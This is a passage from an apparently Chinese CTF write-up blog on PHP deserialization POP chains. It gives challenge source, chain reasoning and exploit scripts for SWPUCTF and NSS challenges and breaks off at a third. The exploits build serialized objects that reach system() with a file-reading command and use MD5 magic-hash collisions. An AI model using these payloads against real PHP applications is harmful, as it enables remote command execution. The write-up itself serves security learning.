#D4D4D4">(</span><span style="color: #9CDCFE">$a</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">?&gt;</span></span></code></pre></div></div></figure><h2 id="多个有类反序列化"><a class="markdownIt-Anchor" href="#多个有类反序列化"></a> 多个有类反序列化</h2><h3 id="swpuctf-2021-新生赛pop"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛pop"></a> [SWPUCTF 2021 新生赛] pop</h3><p>1. 读源码</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4"> &lt;?php</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">error_reporting</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #DCDCAA">show_source</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"index.php"</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">w44m</span><span style="color: #D4D4D4">{</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">private</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$admin</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">'aaa'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">protected</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$passwd</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">'123456'</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">Getflag</span><span style="color: #D4D4D4">(){</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">admin</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">'w44m'</span><span style="color: #D4D4D4"> &amp;&amp; </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">passwd</span><span style="color: #D4D4D4"> ===</span><span style="color: #CE9178">'08067'</span><span style="color: #D4D4D4">){</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #C586C0">include</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'flag.php'</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$flag</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        }</span><span style="color: #C586C0">else</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">admin</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">passwd</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'nono'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">w22m</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$w00m</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__destruct</span><span style="color: #D4D4D4">(){</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">w00m</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">w33m</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$w00m</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$w22m</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__toString</span><span style="color: #D4D4D4">(){</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">w00m</span><span style="color: #D4D4D4">-&gt;{</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">w22m</span><span style="color: #D4D4D4">}();</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #9CDCFE">$w00m</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">$_GET</span><span style="color: #D4D4D4">[</span><span style="color: #CE9178">'w00m'</span><span style="color: #D4D4D4">];</span></span><span class="line"><span style="color: #DCDCAA">unserialize</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$w00m</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">?&gt;</span></span></code></pre></div></div></figure><p>2. 寻找 pop 链</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955"># 传参$w00m,直接反序列化，入口就在__destruct，或者_wakeup，这里的w22m符合条件，并且$w00m参数可控,echo触发__toString，__toString方法又当作函数执行，可以触发w44m里的Getflag函数从而输出flag。</span></span><span class="line"><span style="color: #6A9955"># w22m.__destruct().w00m-&gt;w33m.__toString().w00m-&gt;w44m.Getflag()</span></span></code></pre></div></div></figure><p>3. 写 exp</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">&lt;?php</span></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">w44m</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">private</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$admin</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"w44m"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">protected</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$passwd</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"08067"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">w22m</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$w00m</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">w33m</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$w00m</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$w22m</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #9CDCFE">$a</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">w22m</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #9CDCFE">$b</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">w33m</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #9CDCFE">$c</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">w44m</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #9CDCFE">$a</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">w00m</span><span style="color: #D4D4D4">=</span><span style="color: #9CDCFE">$b</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #9CDCFE">$b</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">w00m</span><span style="color: #D4D4D4">=</span><span style="color: #9CDCFE">$c</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #9CDCFE">$b</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">w22m</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">'Getflag'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">urlencode</span><span style="color: #D4D4D4">(</span><span style="color: #DCDCAA">serialize</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$a</span><span style="color: #D4D4D4">));</span></span></code></pre></div></div></figure><h3 id="swpu-nss新生赛-ez_1zpop"><a class="markdownIt-Anchor" href="#swpu-nss新生赛-ez_1zpop"></a> [SWPU NSS 新生赛]     ez_1zpop</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4"> &lt;?php</span></span><span class="line"><span style="color: #DCDCAA">error_reporting</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">dxg</span></span><span class="line"><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">   </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">fmm</span><span style="color: #D4D4D4">()</span></span><span class="line"><span style="color: #D4D4D4">   {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"nonono"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">   }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">lt</span></span><span class="line"><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">   </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$impo</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">'hi'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">   </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$md51</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">'weclome'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">   </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$md52</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">'to NSS'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">   </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__construct</span><span style="color: #D4D4D4">()</span></span><span class="line"><span style="color: #D4D4D4">   {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">impo</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">dxg</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">   }</span></span><span class="line"><span style="color: #D4D4D4">   </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__wakeup</span><span style="color: #D4D4D4">()</span></span><span class="line"><span style="color: #D4D4D4">   {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">impo</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">dxg</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">impo</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">fmm</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">   }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">   </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__toString</span><span style="color: #D4D4D4">()</span></span><span class="line"><span style="color: #D4D4D4">   {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #DCDCAA">isset</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">impo</span><span style="color: #D4D4D4">) &amp;&amp; </span><span style="color: #DCDCAA">md5</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">md51</span><span style="color: #D4D4D4">) == </span><span style="color: #DCDCAA">md5</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">md52</span><span style="color: #D4D4D4">) &amp;&amp; </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">md51</span><span style="color: #D4D4D4"> != </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">md52</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">         </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">impo</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">fmm</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">   }</span></span><span class="line"><span style="color: #D4D4D4">   </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__destruct</span><span style="color: #D4D4D4">()</span></span><span class="line"><span style="color: #D4D4D4">   {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">   }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">fin</span></span><span class="line"><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">   </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$a</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">   </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$url</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">'https://www.ctfer.vip'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">   </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$title</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">   </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">fmm</span><span style="color: #D4D4D4">()</span></span><span class="line"><span style="color: #D4D4D4">   {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">$b</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">a</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">$b</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">title</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">   }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #DCDCAA">isset</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$_GET</span><span style="color: #D4D4D4">[</span><span style="color: #CE9178">'NSS'</span><span style="color: #D4D4D4">])) {</span></span><span class="line"><span style="color: #D4D4D4">   </span><span style="color: #9CDCFE">$Data</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">unserialize</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$_GET</span><span style="color: #D4D4D4">[</span><span style="color: #CE9178">'NSS'</span><span style="color: #D4D4D4">]);</span></span><span class="line"><span style="color: #D4D4D4">} </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">   </span><span style="color: #DCDCAA">highlight_file</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">__file__</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>2. 找 pop 链，注意里面的细节</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">找一下魔术方法__wakeup，__toString，__destruct，想一下他们的触发方式。</span></span><span class="line"><span style="color: #D4D4D4">__destruct()//对象被销毁时触发</span></span><span class="line"><span style="color: #D4D4D4">__wakeup()//在使用unserialize()时，会检查是否存在一个__wakeup()魔术方法。如果存在，则该方法会先被调用，预先准备对象需要的资源。</span></span><span class="line"><span style="color: #D4D4D4">__toString()//方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4">再去读一下__wakeup()方法，因为这个方法是可能可以做入口的，发现里面代码执行的是fmm函数，而fmm函数返回的是dxg类里的"nonono",代表这题是要绕过__wakeup方法的，不让它执行。</span></span><span class="line"><span style="color: #D4D4D4">再去看__destruct函数，里面执行的是echo语句，可以触发__tostring方法。</span></span><span class="line"><span style="color: #D4D4D4">再去找一下出口，看到还有一个函数，是fin类里面的fmm函数，看fin类里面可以命令执行。现在思路就清晰了。</span></span><span class="line"><span style="color: #D4D4D4">__destruct()-&gt;__toString()-&gt;fin.fmm();</span></span></code></pre></div></div></figure><p>3.exp</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">&lt;?php</span></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">dxg</span></span><span class="line"><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">fmm</span><span style="color: #D4D4D4">()</span></span><span class="line"><span style="color: #D4D4D4">    {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"nonono"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">lt</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$impo</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$md51</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">'QNKCDZO'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$md52</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">'240610708'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">fin</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$a</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"system"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$url</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">'https://www.ctfer.vip'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$title</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"cat ../../../../flag"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #9CDCFE">$a</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">dxg</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #9CDCFE">$nss</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">lt</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #9CDCFE">$c</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">fin</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #9CDCFE">$nss</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">impo</span><span style="color: #D4D4D4">=</span><span style="color: #9CDCFE">$c</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> (</span><span style="color: #DCDCAA">serialize</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$nss</span><span style="color: #D4D4D4">));</span></span></code></pre></div></div></figure><h3 id="newstar新生赛-unserializeone"><a class="markdownIt-Anchor" href="#newstar新生赛-unserializeone"></a> NewStar 新生赛   UnserializeOne</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4"> &lt;?php</span></span><span class="line"><span style="color: #DCDCAA">error_reporting</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">0</span><span style="color: 